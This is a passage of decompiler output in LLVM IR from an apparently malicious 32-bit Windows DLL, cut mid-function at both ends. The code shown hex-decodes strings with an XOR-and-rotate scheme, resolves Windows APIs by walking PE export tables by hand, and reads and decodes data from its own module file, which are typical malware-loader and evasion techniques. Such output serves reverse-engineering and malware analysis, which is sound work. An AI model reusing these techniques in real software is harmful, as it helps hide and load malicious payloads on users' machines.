  br label %dec_label_pc_1000959f, !insn.addr !5419

dec_label_pc_1000959f:                            ; preds = %dec_label_pc_10009594, %dec_label_pc_1000958f
  %stack_var_-8.2.reload = load i8*, i8** %stack_var_-8.2.reg2mem
  %.reload29 = load i32, i32* %.reg2mem28
  %161 = add i32 %esi.1.reload, 4, !insn.addr !5420
  %162 = icmp slt i32 %161, %edi.1.reload, !insn.addr !5421
  store i32 %.reload29, i32* %.reg2mem18, !insn.addr !5421
  store i8* %stack_var_-8.2.reload, i8** %stack_var_-8.0.reg2mem, !insn.addr !5421
  store i32 %161, i32* %esi.1.reg2mem, !insn.addr !5421
  br i1 %162, label %dec_label_pc_10009460, label %dec_label_pc_100095ad, !insn.addr !5421

dec_label_pc_100095ad:                            ; preds = %dec_label_pc_1000959f
  %163 = ptrtoint i8* %stack_var_-8.2.reload to i32, !insn.addr !5422
  store i32 %163, i32* %ebx.3.reg2mem, !insn.addr !5422
  br label %dec_label_pc_100095b0, !insn.addr !5422

dec_label_pc_100095b0:                            ; preds = %dec_label_pc_100095ad, %dec_label_pc_10009450
  %ebx.3.reload = load i32, i32* %ebx.3.reg2mem
  %164 = call i32* @LocalFree(i32* %9), !insn.addr !5423
  %165 = sub i32 %ebx.3.reload, %1, !insn.addr !5424
  ret i32 %165, !insn.addr !5425

dec_label_pc_100095c3:                            ; preds = %dec_label_pc_100093d0
  ret i32 0, !insn.addr !5426
}

define i32 @function_100095d0() local_unnamed_addr {
dec_label_pc_100095d0:
  %ecx.1.reg2mem = alloca i8, !insn.addr !5427
  %eax.0.reg2mem = alloca i8, !insn.addr !5427
  %esi.0.reg2mem = alloca i32, !insn.addr !5427
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = inttoptr i32 %0 to i8*, !insn.addr !5428
  %2 = call i32 @lstrlenA(i8* %1), !insn.addr !5429
  %3 = call i32* @LocalAlloc(i32 64, i32 %2), !insn.addr !5430
  %4 = ptrtoint i32* %3 to i32, !insn.addr !5430
  %5 = call i32 @function_100093d0(), !insn.addr !5431
  %6 = ashr i32 %5, 31, !insn.addr !5432
  %7 = sub i32 %5, %6, !insn.addr !5433
  %8 = sdiv i32 %7, 2, !insn.addr !5434
  %.off = add i32 %7, 1
  %9 = icmp ult i32 %.off, 3
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !5435
  br i1 %9, label %dec_label_pc_1000967a, label %dec_label_pc_10009600, !insn.addr !5435

dec_label_pc_10009600:                            ; preds = %dec_label_pc_100095d0, %dec_label_pc_10009668
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %10 = mul i32 %esi.0.reload, 2, !insn.addr !5436
  %11 = add i32 %10, %4
  %12 = inttoptr i32 %11 to i8*, !insn.addr !5436
  %13 = load i8, i8* %12, align 1, !insn.addr !5436
  %14 = add i8 %13, -48, !insn.addr !5437
  %15 = icmp ult i8 %14, 10
  store i8 %14, i8* %eax.0.reg2mem, !insn.addr !5438
  br i1 %15, label %dec_label_pc_10009632, label %dec_label_pc_10009612, !insn.addr !5438

dec_label_pc_10009612:                            ; preds = %dec_label_pc_10009600
  %16 = add i8 %13, -65, !insn.addr !5439
  %17 = icmp ult i8 %16, 6
  br i1 %17, label %dec_label_pc_10009619, label %dec_label_pc_10009621, !insn.addr !5440

dec_label_pc_10009619:                            ; preds = %dec_label_pc_10009612
  %18 = add i8 %13, -55, !insn.addr !5441
  store i8 %18, i8* %eax.0.reg2mem, !insn.addr !5442
  br label %dec_label_pc_10009632, !insn.addr !5442

dec_label_pc_10009621:                            ; preds = %dec_label_pc_10009612
  %19 = add i8 %13, -97, !insn.addr !5443
  %20 = icmp ult i8 %19, 6
  %21 = add i8 %13, -87
  %spec.select = select i1 %20, i8 %21, i8 0
  store i8 %spec.select, i8* %eax.0.reg2mem
  br label %dec_label_pc_10009632

dec_label_pc_10009632:                            ; preds = %dec_label_pc_10009600, %dec_label_pc_10009621, %dec_label_pc_10009619
  %eax.0.reload = load i8, i8* %eax.0.reg2mem
  %22 = add i32 %11, 1, !insn.addr !5444
  %23 = inttoptr i32 %22 to i8*, !insn.addr !5444
  %24 = load i8, i8* %23, align 1, !insn.addr !5444
  %25 = add i8 %24, -48, !insn.addr !5445
  %26 = icmp ult i8 %25, 10
  store i8 %25, i8* %ecx.1.reg2mem, !insn.addr !5446
  br i1 %26, label %dec_label_pc_10009668, label %dec_label_pc_10009646, !insn.addr !5446

dec_label_pc_10009646:                            ; preds = %dec_label_pc_10009632
  %27 = add i8 %24, -65, !insn.addr !5447
  %28 = icmp ult i8 %27, 6
  br i1 %28, label %dec_label_pc_1000964e, label %dec_label_pc_10009656, !insn.addr !5448

dec_label_pc_1000964e:                            ; preds = %dec_label_pc_10009646
  %29 = add i8 %24, -55, !insn.addr !5449
  store i8 %29, i8* %ecx.1.reg2mem, !insn.addr !5450
  br label %dec_label_pc_10009668, !insn.addr !5450

dec_label_pc_10009656:                            ; preds = %dec_label_pc_10009646
  %30 = add i8 %24, -97, !insn.addr !5451
  %31 = icmp ult i8 %30, 6
  %32 = add i8 %24, -87
  %spec.select7 = select i1 %31, i8 %32, i8 0
  store i8 %spec.select7, i8* %ecx.1.reg2mem
  br label %dec_label_pc_10009668

dec_label_pc_10009668:                            ; preds = %dec_label_pc_10009632, %dec_label_pc_10009656, %dec_label_pc_1000964e
  %ecx.1.reload = load i8, i8* %ecx.1.reg2mem
  %33 = mul i8 %eax.0.reload, 16, !insn.addr !5452
  %34 = add i8 %ecx.1.reload, %33, !insn.addr !5453
  %35 = xor i8 %34, 35, !insn.addr !5454
  %36 = mul i8 %35, 8, !insn.addr !5454
  %37 = udiv i8 %35, 32, !insn.addr !5454
  %38 = or i8 %37, %36, !insn.addr !5454
  %39 = add i32 %esi.0.reload, %4, !insn.addr !5455
  %40 = inttoptr i32 %39 to i8*, !insn.addr !5455
  store i8 %38, i8* %40, align 1, !insn.addr !5455
  %41 = add i32 %esi.0.reload, 1, !insn.addr !5456
  %42 = icmp eq i32 %41, %8, !insn.addr !5457
  %43 = icmp eq i1 %42, false, !insn.addr !5458
  store i32 %41, i32* %esi.0.reg2mem, !insn.addr !5458
  br i1 %43, label %dec_label_pc_10009600, label %dec_label_pc_1000967a, !insn.addr !5458

dec_label_pc_1000967a:                            ; preds = %dec_label_pc_10009668, %dec_label_pc_100095d0
  ret i32 %4, !insn.addr !5459
}

define i32 @function_10009680(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10009680:
  %esp.6.reg2mem = alloca i32, !insn.addr !5460
  %esi.2.reg2mem = alloca i32, !insn.addr !5460
  %ecx.2.reg2mem = alloca i32, !insn.addr !5460
  %esp.5.reg2mem = alloca i32, !insn.addr !5460
  %.reg2mem24 = alloca i1, !insn.addr !5460
  %.reg2mem = alloca i1, !insn.addr !5460
  %esp.4.reg2mem = alloca i32, !insn.addr !5460
  %esp.3.reg2mem = alloca i32, !insn.addr !5460
  %ecx.1.reg2mem = alloca i8, !insn.addr !5460
  %eax.0.reg2mem = alloca i8, !insn.addr !5460
  %esi.1.reg2mem = alloca i32, !insn.addr !5460
  %esp.1.reg2mem = alloca i32, !insn.addr !5460
  %esi.0.reg2mem = alloca i32, !insn.addr !5460
  %esp.0.reg2mem = alloca i32, !insn.addr !5460
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-368 = alloca i8*, align 4
  %stack_var_-367 = alloca i32, align 4
  %stack_var_-32 = alloca i16*, align 4
  %stack_var_-1000 = alloca i32, align 4
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1556 = alloca i32, align 4
  %stack_var_-160 = alloca i8*, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-1264 = alloca i128, align 8
  %stack_var_-736 = alloca i32, align 4
  %stack_var_-1600 = alloca i32, align 4
  %stack_var_-56 = alloca i64, align 8
  %2 = call i64 @__decompiler_undefined_function_6()
  %stack_var_-1528 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %3 = call i32* @_memset(i32* nonnull %stack_var_-1528, i32 0, i32 260), !insn.addr !5461
  %4 = bitcast i32* %stack_var_-1528 to i8*
  %5 = call i32 @GetModuleFileNameA(i32* null, i8* nonnull %4, i32 260), !insn.addr !5462
  %6 = call i128 @__asm_movq(i64 3689694281447204460), !insn.addr !5463
  %7 = ptrtoint i64* %stack_var_-56 to i32, !insn.addr !5464
  store i32 %7, i32* %stack_var_-1600, align 4, !insn.addr !5464
  %8 = ptrtoint i32* %stack_var_-1600 to i32, !insn.addr !5464
  %9 = mul i64 %2, 4294967296
  %10 = sdiv i64 %9, 4294967296, !insn.addr !5465
  call void @__asm_movq.31(i64 %10, i128 %6), !insn.addr !5465
  %11 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !5466
  %12 = icmp slt i32 %11, 1
  store i32 %8, i32* %esp.1.reg2mem, !insn.addr !5467
  br i1 %12, label %dec_label_pc_10009715, label %dec_label_pc_10009706.preheader, !insn.addr !5467

dec_label_pc_10009706.preheader:                  ; preds = %dec_label_pc_10009680
  %13 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !5468
  %14 = add i32 %13, -52, !insn.addr !5469
  store i32 %8, i32* %esp.0.reg2mem
  store i32 0, i32* %esi.0.reg2mem
  br label %dec_label_pc_10009706

dec_label_pc_10009706:                            ; preds = %dec_label_pc_10009706.preheader, %dec_label_pc_10009706
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = add i32 %14, %esi.0.reload, !insn.addr !5469
  %16 = inttoptr i32 %15 to i8*, !insn.addr !5469
  %17 = load i8, i8* %16, align 1, !insn.addr !5469
  %18 = add i8 %17, -1, !insn.addr !5469
  store i8 %18, i8* %16, align 1, !insn.addr !5469
  %19 = add i32 %esp.0.reload, -4, !insn.addr !5470
  %20 = inttoptr i32 %19 to i32*, !insn.addr !5470
  store i32 %7, i32* %20, align 4, !insn.addr !5470
  %21 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !5471
  %22 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !5472
  %23 = icmp slt i32 %21, %22, !insn.addr !5473
  store i32 %19, i32* %esp.0.reg2mem, !insn.addr !5473
  store i32 %21, i32* %esi.0.reg2mem, !insn.addr !5473
  store i32 %19, i32* %esp.1.reg2mem, !insn.addr !5473
  br i1 %23, label %dec_label_pc_10009706, label %dec_label_pc_10009715, !insn.addr !5473

dec_label_pc_10009715:                            ; preds = %dec_label_pc_10009706, %dec_label_pc_10009680
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %24 = add i32 %esp.1.reload, -4, !insn.addr !5474
  %25 = inttoptr i32 %24 to i32*, !insn.addr !5474
  store i32 260, i32* %25, align 4, !insn.addr !5474
  %26 = add i32 %esp.1.reload, -8, !insn.addr !5475
  %27 = inttoptr i32 %26 to i32*, !insn.addr !5475
  store i32 0, i32* %27, align 4, !insn.addr !5475
  %28 = add i32 %esp.1.reload, -12, !insn.addr !5476
  %29 = inttoptr i32 %28 to i32*, !insn.addr !5476
  %30 = ptrtoint i32* %stack_var_-736 to i32, !insn.addr !5476
  store i32 %30, i32* %29, align 4, !insn.addr !5476
  %31 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5477
  store i32 260, i32* %25, align 4, !insn.addr !5478
  store i32 0, i32* %27, align 4, !insn.addr !5479
  %32 = ptrtoint i128* %stack_var_-1264 to i32, !insn.addr !5480
  store i32 %32, i32* %29, align 4, !insn.addr !5480
  %33 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5481
  store i32 %7, i32* %25, align 4, !insn.addr !5482
  %34 = call i32* @GetModuleHandleA(i8* bitcast (i32* @1 to i8*)), !insn.addr !5483
  %35 = ptrtoint i32* %34 to i32, !insn.addr !5483
  store i32 1684107084, i32* %stack_var_-736, align 4, !insn.addr !5484
  %36 = add i32 %35, 60, !insn.addr !5485
  %37 = inttoptr i32 %36 to i32*, !insn.addr !5485
  %38 = load i32, i32* %37, align 4, !insn.addr !5485
  %39 = add i32 %35, 120, !insn.addr !5486
  %40 = add i32 %39, %38, !insn.addr !5486
  %41 = inttoptr i32 %40 to i32*, !insn.addr !5486
  %42 = load i32, i32* %41, align 4, !insn.addr !5486
  %43 = add i32 %42, %35, !insn.addr !5487
  store i32 %30, i32* %27, align 4, !insn.addr !5488
  store i32 %35, i32* %29, align 4, !insn.addr !5489
  %44 = load i32, i32* %stack_var_-736, align 4, !insn.addr !5490
  %45 = call i32 @function_10009e60(i32 %44, i32* inttoptr (i32 1919052108 to i32*)), !insn.addr !5490
  %46 = add i32 %43, 36, !insn.addr !5491
  %47 = inttoptr i32 %46 to i32*, !insn.addr !5491
  %48 = load i32, i32* %47, align 4, !insn.addr !5491
  %49 = load i128, i128* @global_var_10039ad0, align 4, !insn.addr !5492
  %50 = call i128 @__asm_movaps(i128 %49), !insn.addr !5492
  %51 = mul i32 %45, 2, !insn.addr !5493
  %52 = add i32 %51, %35, !insn.addr !5493
  %53 = add i32 %52, %48, !insn.addr !5494
  %54 = inttoptr i32 %53 to i16*, !insn.addr !5494
  %55 = load i16, i16* %54, align 2, !insn.addr !5494
  %56 = zext i16 %55 to i32, !insn.addr !5494
  %57 = add i32 %43, 28, !insn.addr !5495
  %58 = inttoptr i32 %57 to i32*, !insn.addr !5495
  %59 = load i32, i32* %58, align 4, !insn.addr !5495
  %60 = mul i32 %56, 4, !insn.addr !5496
  %61 = add i32 %59, %35, !insn.addr !5496
  %62 = add i32 %61, %60, !insn.addr !5497
  %63 = inttoptr i32 %62 to i32*, !insn.addr !5497
  %64 = load i32, i32* %63, align 4, !insn.addr !5497
  %65 = add i32 %64, %35, !insn.addr !5498
  store i32 %7, i32* %27, align 4, !insn.addr !5499
  store i32 %65, i32* @global_var_1004094c, align 4, !insn.addr !5500
  call void @__asm_movups(i128 undef, i128 %50), !insn.addr !5501
  store i32 %32, i32* %29, align 4, !insn.addr !5502
  %66 = add i32 %esp.1.reload, -16, !insn.addr !5503
  %67 = inttoptr i32 %66 to i32*, !insn.addr !5503
  store i32 %65, i32* %67, align 4, !insn.addr !5503
  %68 = add i32 %65, 60, !insn.addr !5504
  %69 = inttoptr i32 %68 to i32*, !insn.addr !5504
  %70 = load i32, i32* %69, align 4, !insn.addr !5504
  %71 = add i32 %65, 120
  %72 = add i32 %70, %71, !insn.addr !5505
  %73 = inttoptr i32 %72 to i32*, !insn.addr !5505
  %74 = load i32, i32* %73, align 4, !insn.addr !5505
  %75 = add i32 %74, %65, !insn.addr !5506
  %76 = call i32 @function_10009e60(i32 %65, i32* nonnull @1), !insn.addr !5507
  %77 = add i32 %75, 36, !insn.addr !5508
  %78 = inttoptr i32 %77 to i32*, !insn.addr !5508
  %79 = load i32, i32* %78, align 4, !insn.addr !5508
  %80 = add i32 %esp.1.reload, -20, !insn.addr !5509
  %81 = inttoptr i32 %80 to i32*, !insn.addr !5509
  store i32 ptrtoint ([12 x i8]* @global_var_10039518 to i32), i32* %81, align 4, !insn.addr !5509
  %82 = add i32 %esp.1.reload, -24, !insn.addr !5510
  %83 = inttoptr i32 %82 to i32*, !insn.addr !5510
  store i32 %65, i32* %83, align 4, !insn.addr !5510
  %84 = mul i32 %76, 2, !insn.addr !5511
  %85 = add i32 %84, %65, !insn.addr !5511
  %86 = add i32 %85, %79, !insn.addr !5512
  %87 = inttoptr i32 %86 to i16*, !insn.addr !5512
  %88 = load i16, i16* %87, align 2, !insn.addr !5512
  %89 = zext i16 %88 to i32, !insn.addr !5512
  %90 = add i32 %75, 28, !insn.addr !5513
  %91 = inttoptr i32 %90 to i32*, !insn.addr !5513
  %92 = load i32, i32* %91, align 4, !insn.addr !5513
  %93 = mul i32 %89, 4, !insn.addr !5514
  %94 = add i32 %92, %65, !insn.addr !5514
  %95 = add i32 %94, %93, !insn.addr !5515
  %96 = inttoptr i32 %95 to i32*, !insn.addr !5515
  %97 = load i32, i32* %96, align 4, !insn.addr !5515
  %98 = add i32 %97, %65, !insn.addr !5516
  %99 = load i32, i32* %69, align 4, !insn.addr !5517
  %100 = add i32 %99, %71, !insn.addr !5518
  %101 = inttoptr i32 %100 to i32*, !insn.addr !5518
  %102 = load i32, i32* %101, align 4, !insn.addr !5518
  %103 = add i32 %102, %65, !insn.addr !5519
  %104 = call i32 @function_10009e60(i32 %98, i32* nonnull @1), !insn.addr !5520
  %105 = add i32 %103, 36, !insn.addr !5521
  %106 = inttoptr i32 %105 to i32*, !insn.addr !5521
  %107 = load i32, i32* %106, align 4, !insn.addr !5521
  %108 = mul i32 %104, 2, !insn.addr !5522
  %109 = add i32 %108, %65, !insn.addr !5522
  %110 = add i32 %109, %107, !insn.addr !5523
  %111 = inttoptr i32 %110 to i16*, !insn.addr !5523
  %112 = load i16, i16* %111, align 2, !insn.addr !5523
  %113 = zext i16 %112 to i32, !insn.addr !5523
  %114 = add i32 %103, 28, !insn.addr !5524
  %115 = inttoptr i32 %114 to i32*, !insn.addr !5524
  %116 = load i32, i32* %115, align 4, !insn.addr !5524
  %117 = mul i32 %113, 4, !insn.addr !5525
  %118 = add i32 %116, %65, !insn.addr !5525
  %119 = add i32 %118, %117, !insn.addr !5526
  %120 = inttoptr i32 %119 to i32*, !insn.addr !5526
  %121 = load i32, i32* %120, align 4, !insn.addr !5526
  %122 = add i32 %121, %65, !insn.addr !5527
  %123 = add i32 %esp.1.reload, -28, !insn.addr !5528
  %124 = inttoptr i32 %123 to i32*, !insn.addr !5528
  store i32 99, i32* %124, align 4, !insn.addr !5528
  %125 = add i32 %esp.1.reload, -32, !insn.addr !5529
  %126 = inttoptr i32 %125 to i32*, !insn.addr !5529
  store i32 0, i32* %126, align 4, !insn.addr !5529
  %127 = add i32 %esp.1.reload, -36, !insn.addr !5530
  %128 = inttoptr i32 %127 to i32*, !insn.addr !5530
  %129 = ptrtoint i32* %stack_var_-159 to i32, !insn.addr !5530
  store i32 %129, i32* %128, align 4, !insn.addr !5530
  %130 = inttoptr i32 %122 to i32*, !insn.addr !5531
  %131 = call i32* @_memset(i32* %130, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5531
  store i32 100, i32* %29, align 4, !insn.addr !5532
  store i32 0, i32* %67, align 4, !insn.addr !5533
  %132 = ptrtoint i32* %stack_var_-264 to i32, !insn.addr !5534
  store i32 %132, i32* %81, align 4, !insn.addr !5534
  %133 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5535
  store i8* inttoptr (i32 1852990827 to i8*), i8** %stack_var_-160, align 4, !insn.addr !5536
  %134 = ptrtoint i8** %stack_var_-160 to i32, !insn.addr !5537
  store i32 %134, i32* %29, align 4, !insn.addr !5537
  %135 = load i8*, i8** %stack_var_-160, align 4, !insn.addr !5538
  %136 = call i32* @GetModuleHandleA(i8* %135), !insn.addr !5538
  %137 = ptrtoint i32* %136 to i32, !insn.addr !5538
  store i32 1684107084, i32* %stack_var_-264, align 4, !insn.addr !5539
  %138 = add i32 %137, 60, !insn.addr !5540
  %139 = inttoptr i32 %138 to i32*, !insn.addr !5540
  %140 = load i32, i32* %139, align 4, !insn.addr !5540
  %141 = add i32 %137, 120, !insn.addr !5541
  %142 = add i32 %141, %140, !insn.addr !5541
  %143 = inttoptr i32 %142 to i32*, !insn.addr !5541
  %144 = load i32, i32* %143, align 4, !insn.addr !5541
  %145 = add i32 %144, %137, !insn.addr !5542
  store i32 %132, i32* %67, align 4, !insn.addr !5543
  store i32 %137, i32* %81, align 4, !insn.addr !5544
  %146 = load i32, i32* %stack_var_-264, align 4, !insn.addr !5545
  %147 = call i32 @function_10009e60(i32 %146, i32* inttoptr (i32 1919052108 to i32*)), !insn.addr !5545
  %148 = add i32 %145, 36, !insn.addr !5546
  %149 = inttoptr i32 %148 to i32*, !insn.addr !5546
  %150 = load i32, i32* %149, align 4, !insn.addr !5546
  %151 = mul i32 %147, 2, !insn.addr !5547
  %152 = add i32 %151, %137, !insn.addr !5547
  %153 = add i32 %152, %150, !insn.addr !5548
  %154 = inttoptr i32 %153 to i16*, !insn.addr !5548
  %155 = load i16, i16* %154, align 2, !insn.addr !5548
  %156 = zext i16 %155 to i32, !insn.addr !5548
  %157 = add i32 %145, 28, !insn.addr !5549
  %158 = inttoptr i32 %157 to i32*, !insn.addr !5549
  %159 = load i32, i32* %158, align 4, !insn.addr !5549
  %160 = mul i32 %156, 4, !insn.addr !5550
  %161 = add i32 %159, %137, !insn.addr !5550
  %162 = add i32 %161, %160, !insn.addr !5551
  %163 = inttoptr i32 %162 to i32*, !insn.addr !5551
  %164 = load i32, i32* %163, align 4, !insn.addr !5551
  %165 = add i32 %164, %137, !insn.addr !5552
  store i32 %134, i32* %67, align 4, !insn.addr !5553
  store i32 %165, i32* @global_var_1004094c, align 4, !insn.addr !5554
  store i32 1633906508, i32* %stack_var_-736, align 4, !insn.addr !5555
  %166 = load i32, i32* %69, align 4, !insn.addr !5556
  %167 = add i32 %166, %71, !insn.addr !5557
  %168 = inttoptr i32 %167 to i32*, !insn.addr !5557
  %169 = load i32, i32* %168, align 4, !insn.addr !5557
  %170 = add i32 %169, %65, !insn.addr !5558
  store i32 %132, i32* %81, align 4, !insn.addr !5559
  store i32 %65, i32* %83, align 4, !insn.addr !5560
  %171 = load i32, i32* %stack_var_-736, align 4, !insn.addr !5561
  %172 = call i32 @function_10009e60(i32 %171, i32* inttoptr (i32 1701987948 to i32*)), !insn.addr !5561
  %173 = add i32 %170, 36, !insn.addr !5562
  %174 = inttoptr i32 %173 to i32*, !insn.addr !5562
  %175 = load i32, i32* %174, align 4, !insn.addr !5562
  %176 = mul i32 %172, 2, !insn.addr !5563
  %177 = add i32 %176, %65, !insn.addr !5563
  %178 = add i32 %177, %175, !insn.addr !5564
  %179 = inttoptr i32 %178 to i16*, !insn.addr !5564
  %180 = load i16, i16* %179, align 2, !insn.addr !5564
  %181 = zext i16 %180 to i32, !insn.addr !5564
  %182 = add i32 %170, 28, !insn.addr !5565
  %183 = inttoptr i32 %182 to i32*, !insn.addr !5565
  %184 = load i32, i32* %183, align 4, !insn.addr !5565
  store i32 0, i32* %81, align 4, !insn.addr !5566
  store i32 128, i32* %83, align 4, !insn.addr !5567
  store i32 4, i32* %124, align 4, !insn.addr !5568
  store i32 0, i32* %126, align 4, !insn.addr !5569
  %185 = mul i32 %181, 4, !insn.addr !5570
  %186 = add i32 %184, %65, !insn.addr !5570
  %187 = add i32 %186, %185, !insn.addr !5571
  %188 = inttoptr i32 %187 to i32*, !insn.addr !5571
  %189 = load i32, i32* %188, align 4, !insn.addr !5571
  store i32 0, i32* %128, align 4, !insn.addr !5572
  %190 = add i32 %esp.1.reload, -40, !insn.addr !5573
  %191 = inttoptr i32 %190 to i32*, !insn.addr !5573
  store i32 -2147483648, i32* %191, align 4, !insn.addr !5573
  %192 = add i32 %189, %65, !insn.addr !5574
  %193 = inttoptr i32 %192 to i16*, !insn.addr !5575
  %194 = call i32* @CreateFileW(i16* %193, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !5576
  %195 = ptrtoint i32* %194 to i32, !insn.addr !5576
  %196 = add i32 %esp.1.reload, -48, !insn.addr !5577
  %197 = inttoptr i32 %196 to i32*, !insn.addr !5577
  %198 = ptrtoint i32* %stack_var_-1556 to i32, !insn.addr !5577
  store i32 %198, i32* %197, align 4, !insn.addr !5577
  %199 = add i32 %esp.1.reload, -52, !insn.addr !5578
  %200 = inttoptr i32 %199 to i32*, !insn.addr !5578
  store i32 %195, i32* %200, align 4, !insn.addr !5578
  %201 = call i32 @GetFileSize(i32* nonnull @1, i32* nonnull @1)
  %202 = add i32 %esp.1.reload, -56, !insn.addr !5579
  %203 = inttoptr i32 %202 to i32*, !insn.addr !5579
  store i32 %201, i32* %203, align 4, !insn.addr !5579
  %204 = add i32 %esp.1.reload, -60, !insn.addr !5580
  %205 = inttoptr i32 %204 to i32*, !insn.addr !5580
  store i32 64, i32* %205, align 4, !insn.addr !5580
  store i32 %201, i32* %stack_var_-1540, align 4, !insn.addr !5581
  %206 = call i32* @LocalAlloc(i32 %201, i32 ptrtoint (i32* @1 to i32)), !insn.addr !5582
  %207 = ptrtoint i32* %206 to i32, !insn.addr !5582
  %208 = add i32 %esp.1.reload, -64, !insn.addr !5583
  %209 = inttoptr i32 %208 to i32*, !insn.addr !5583
  store i32 %201, i32* %209, align 4, !insn.addr !5583
  %210 = add i32 %esp.1.reload, -68, !insn.addr !5584
  %211 = inttoptr i32 %210 to i32*, !insn.addr !5584
  store i32 64, i32* %211, align 4, !insn.addr !5584
  %212 = call i32* @LocalAlloc(i32 %207, i32 ptrtoint (i32* @1 to i32)), !insn.addr !5585
  %213 = add i32 %esp.1.reload, -72, !insn.addr !5586
  %214 = inttoptr i32 %213 to i32*, !insn.addr !5586
  store i32 0, i32* %214, align 4, !insn.addr !5586
  store i32 7143516, i32* %stack_var_-472, align 4, !insn.addr !5587
  %215 = add i32 %esp.1.reload, -76, !insn.addr !5588
  %216 = inttoptr i32 %215 to i32*, !insn.addr !5588
  store i32 %198, i32* %216, align 4, !insn.addr !5588
  %217 = load i32, i32* %stack_var_-1540, align 4, !insn.addr !5589
  %218 = add i32 %esp.1.reload, -80, !insn.addr !5589
  %219 = inttoptr i32 %218 to i32*, !insn.addr !5589
  store i32 %217, i32* %219, align 4, !insn.addr !5589
  %220 = add i32 %esp.1.reload, -84, !insn.addr !5590
  %221 = inttoptr i32 %220 to i32*, !insn.addr !5590
  store i32 %207, i32* %221, align 4, !insn.addr !5590
  %222 = add i32 %esp.1.reload, -88, !insn.addr !5591
  %223 = inttoptr i32 %222 to i32*, !insn.addr !5591
  store i32 %195, i32* %223, align 4, !insn.addr !5591
  %224 = load i32, i32* %stack_var_-472, align 4, !insn.addr !5592
  %225 = inttoptr i32 %224 to i32*, !insn.addr !5592
  %226 = call i1 @ReadFile(i32* %225, i32* inttoptr (i32 7077997 to i32*), i32 110, i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !5592
  %227 = add i32 %esp.1.reload, -92, !insn.addr !5593
  %228 = inttoptr i32 %227 to i32*, !insn.addr !5593
  store i32 %195, i32* %228, align 4, !insn.addr !5593
  %229 = call i1 @CloseHandle(i32* nonnull @1), !insn.addr !5594
  %230 = load i32, i32* %stack_var_-1540, align 4, !insn.addr !5595
  %231 = icmp eq i32 %230, 0, !insn.addr !5595
  %232 = icmp eq i1 %231, false, !insn.addr !5596
  br i1 %232, label %dec_label_pc_10009a0d, label %dec_label_pc_100099fa, !insn.addr !5596

dec_label_pc_100099fa:                            ; preds = %dec_label_pc_10009715
  %233 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5597
  ret i32 %233, !insn.addr !5598

dec_label_pc_10009a0d:                            ; preds = %dec_label_pc_10009715
  %234 = ptrtoint i32* %212 to i32, !insn.addr !5585
  store i8* inttoptr (i32 168626701 to i8*), i8** %stack_var_-40, align 4, !insn.addr !5599
  %235 = add i32 %esp.1.reload, -96, !insn.addr !5600
  %236 = inttoptr i32 %235 to i32*, !insn.addr !5600
  %237 = ptrtoint i8** %stack_var_-40 to i32, !insn.addr !5600
  store i32 %237, i32* %236, align 4, !insn.addr !5600
  %238 = add i32 %esp.1.reload, -100, !insn.addr !5601
  %239 = inttoptr i32 %238 to i32*, !insn.addr !5601
  store i32 %207, i32* %239, align 4, !insn.addr !5601
  %240 = load i8*, i8** %stack_var_-40, align 4, !insn.addr !5602
  %241 = call i8* @StrStrIA(i8* %240, i8* null), !insn.addr !5602
  %242 = call i32 @function_100093d0(), !insn.addr !5603
  %243 = ashr i32 %242, 31, !insn.addr !5604
  %244 = sub i32 %242, %243, !insn.addr !5605
  %245 = sdiv i32 %244, 2, !insn.addr !5606
  %.off = add i32 %244, 1
  %246 = icmp ult i32 %.off, 3
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !5607
  br i1 %246, label %dec_label_pc_10009ac2, label %dec_label_pc_10009a48, !insn.addr !5607

dec_label_pc_10009a48:                            ; preds = %dec_label_pc_10009a0d, %dec_label_pc_10009ab0
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %247 = mul i32 %esi.1.reload, 2, !insn.addr !5608
  %248 = add i32 %247, %234
  %249 = inttoptr i32 %248 to i8*, !insn.addr !5608
  %250 = load i8, i8* %249, align 1, !insn.addr !5608
  %251 = add i8 %250, -48, !insn.addr !5609
  %252 = icmp ult i8 %251, 10
  store i8 %251, i8* %eax.0.reg2mem, !insn.addr !5610
  br i1 %252, label %dec_label_pc_10009a7a, label %dec_label_pc_10009a5a, !insn.addr !5610

dec_label_pc_10009a5a:                            ; preds = %dec_label_pc_10009a48
  %253 = add i8 %250, -65, !insn.addr !5611
  %254 = icmp ult i8 %253, 6
  br i1 %254, label %dec_label_pc_10009a61, label %dec_label_pc_10009a69, !insn.addr !5612

dec_label_pc_10009a61:                            ; preds = %dec_label_pc_10009a5a
  %255 = add i8 %250, -55, !insn.addr !5613
